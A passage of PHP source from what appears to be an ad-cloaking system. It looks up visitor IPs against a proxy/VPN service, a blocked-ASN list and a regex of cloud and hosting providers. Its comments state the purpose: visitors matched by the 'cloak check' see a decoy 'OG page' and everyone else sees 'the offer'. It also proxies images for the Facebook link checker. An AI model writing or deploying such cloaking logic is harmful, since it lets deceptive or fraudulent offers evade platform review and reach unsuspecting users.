                if ($cached['r'] === null && $age < $unknownCacheTtl) {
                    return null;
                }
            }
        }
    }

    if (!function_exists('curl_init')) {
        return null;
    }

    $ch = curl_init('https://blackbox.ipinfo.app/api/v1/' . rawurlencode($ip));

    if ($ch === false) {
        return null;
    }

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        // Millisecond budget (was 1s connect / 2s total): this call sits inline
        // in the hot path during filter-mode windows, so a slow/unresponsive
        // upstream directly adds to the visitor's redirect latency. A timeout
        // here fails to null ("unknown"), which srp_is_proxy_or_vpn() callers
        // already treat as fail-closed (no filter divert) — tightening the
        // budget only trades a slightly higher unknown-rate under real network
        // jitter for a hard cap on worst-case added latency. CURLOPT_NOSIGNAL
        // is required for sub-second CURLOPT_*TIMEOUT_MS to be honored when
        // libcurl resolves DNS synchronously.
        CURLOPT_NOSIGNAL => true,
        CURLOPT_CONNECTTIMEOUT_MS => 500,
        CURLOPT_TIMEOUT_MS => 1000,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_HTTPHEADER => ['Accept: application/json'],
        CURLOPT_USERAGENT => 'SRP/1.0',
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_PROTOCOLS => CURLPROTO_HTTPS,
        CURLOPT_REDIR_PROTOCOLS => CURLPROTO_HTTPS,
    ]);

    $body = curl_exec($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $errno = curl_errno($ch);
    curl_close($ch);

    if ($errno !== 0 || !is_string($body) || $httpCode !== 200) {
        return srp_blackbox_remember($cacheDir, $cacheFile, null);
    }

    // blackbox v1 returns a single character: Y = listed (proxy/VPN/Tor/cloud),
    // N = clean, E = error. Older/alternate responses are a JSON object with
    // boolean flags — handle both so the lookup never silently fail-opens.
    $token = strtoupper(trim($body));

    if ($token === 'Y' || $token === 'N') {
        $isPrivacy = ($token === 'Y');
    } elseif ($token === 'E' || $token === '') {
        return srp_blackbox_remember($cacheDir, $cacheFile, null);
    } else {
        $data = json_decode($body, true);

        if (!is_array($data)) {
            return srp_blackbox_remember($cacheDir, $cacheFile, null);
        }

        $isPrivacy = (bool) ($data['vpn'] ?? false)
            || (bool) ($data['proxy'] ?? false)
            || (bool) ($data['tor'] ?? false)
            || (bool) ($data['cloud'] ?? false);
    }

    return srp_blackbox_remember($cacheDir, $cacheFile, $isPrivacy);
}

/**
 * Persist a blackbox result — including the "unknown" null — and return it, so a
 * slow or failing upstream is paid for once per IP per TTL instead of on every
 * request through the hot path.
 */
function srp_blackbox_remember(string $cacheDir, string $cacheFile, ?bool $result): ?bool
{
    if (!is_dir($cacheDir)) {
        @mkdir($cacheDir, 0700, true);
    }

    @file_put_contents($cacheFile, json_encode(['r' => $result]), LOCK_EX);

    return $result;
}

// ── ASN lookup ───────────────────────────────────────────────────────────────

/**
 * Resolve ASN data for an IP using the GeoLite2-ASN database.
 *
 * Memoized per-request/per-IP: srp_is_blocked_asn() (cloak check, step 3) and
 * srp_is_proxy_or_vpn() → srp_is_hosting_ip() (filter check, step 5) both
 * resolve the same visitor IP within one request. Without this, each call
 * re-reads and re-decodes the on-disk asn_ cache file for an identical result.
 *
 * @return array{asn?: int, org?: string}
 */
function srp_resolve_asn(string $ip): array
{
    /** @var GeoResolver|null $resolver */
    static $resolver = null;
    /** @var array<string, array{asn?: int, org?: string}> $cache */
    static $cache = [];

    if (array_key_exists($ip, $cache)) {
        return $cache[$ip];
    }

    if ($resolver === null) {
        $resolver = new GeoResolver(SRP_GEOIP2ASN_DB, SRP_CACHE_DIR_NAME);
    }

    return $cache[$ip] = $resolver->resolveAsn(SRP_GEOIP2ASN_DB, $ip);
}

/**
 * Cloaking check — is this IP on the bulk blocked-ASN list?
 *
 * Separate from srp_is_hosting_ip(): that one feeds the proxy/VPN decision used
 * by the timed filter, while this one decides whether the visitor is served the
 * OG page instead of the offer. Keeping them apart means the small curated
 * SRP_HOSTING_ASNS list stays readable and the bulk feed can be regenerated
 * without touching code.
 *
 * The map is loaded once per request and memoized; opcache keeps the compiled
 * literal in shared memory, so this costs an isset() after the first call.
 * A missing or malformed data file degrades to "not blocked" rather than
 * cloaking everyone.
 */
function srp_is_blocked_asn(string $ip): bool
{
    static $map = null;

    if ($map === null) {
        $path = __DIR__ . '/blocked_asns.php';
        $loaded = is_file($path) && is_readable($path) ? require $path : null;
        $map = is_array($loaded) ? $loaded : [];
    }

    if ($map === [] || $ip === '' || !srp_is_valid_ip($ip)) {
        return false;
    }

    $asnData = srp_resolve_asn($ip);

    return isset($asnData['asn']) && isset($map[$asnData['asn']]);
}

/**
 * Detect whether an organization name string suggests hosting/cloud/datacenter.
 *
 * Matches common patterns in MaxMind autonomous_system_organization.
 */
function srp_is_hosting_org(string $org): bool
{
    $lower = strtolower($org);

    return (bool) preg_match(
        '/(?:^|\b)(?:hosting|vps|cloud|server|datacenter|colocation|colo-?crossing'
        . '|dedicated|shared\s+hosting|web\s+host|isp\s+host'
        . '|digitalocean|linode|vultr|hetzner|ovh|netcup|contabo'
        . '|hostinger|namecheap|sharktech|servers\.com|choopa'
        . '|amazon\.com|amazon\s+technologies|amazon\s+data'
        . '|google\s+cloud|google\s+llc'
        . '|microsoft\s+corporation|microsoft\s+azure'
        . '|alibaba|tencent\s+cloud'
        . '|softlayer|sendgrid|twilio'
        . '|scaleway|online\s+s\.?a\.?s'
        . '|godaddy)(?:\b|$)/i',
        $lower,
    ) === 1;
}

/**
 * Check whether an IP belongs to a known hosting/cloud ASN or organization.
 * Returns true if the IP IS hosting infrastructure (not residential).
 * Returns null if ASN data is unavailable (caller should fall back to other checks).
 *
 * @return bool|null
 */
function srp_is_hosting_ip(string $ip): ?bool
{
    $asnData = srp_resolve_asn($ip);

    if ($asnData === []) {
        return null;
    }

    // Check known ASN list first (cheap, exact match)
    if (isset($asnData['asn']) && in_array($asnData['asn'], SRP_HOSTING_ASNS, true)) {
        return true;
    }

    // Check organization name pattern (broader, catches new/dynamic ASNs)
    if (isset($asnData['org']) && srp_is_hosting_org($asnData['org'])) {
        return true;
    }

    return false;
}

// ── Image proxy helper ───────────────────────────────────────────────────────

function srp_proxy_image_url(string $imageUrl): string
{
    if ($imageUrl === '') {
        return '';
    }

    $host = srp_server_string('HTTP_HOST');

    if (!srp_validate_host($host)) {
        return '';
    }

    // Proxy through same-origin /imgp so FB linter can always fetch the image
    $encoded = rtrim(strtr(base64_encode($imageUrl), '+/', '-_'), '=');
    $scheme = srp_is_https() ? 'https' : 'http';

    return $scheme . '://' . $host . '/imgp?u=' . rawurlencode($encoded);
}

// srp_render_og() → render_og.php
// srp_render_landing() → render_landing.php
// srp_render_landing_2() → render_landing_2.php
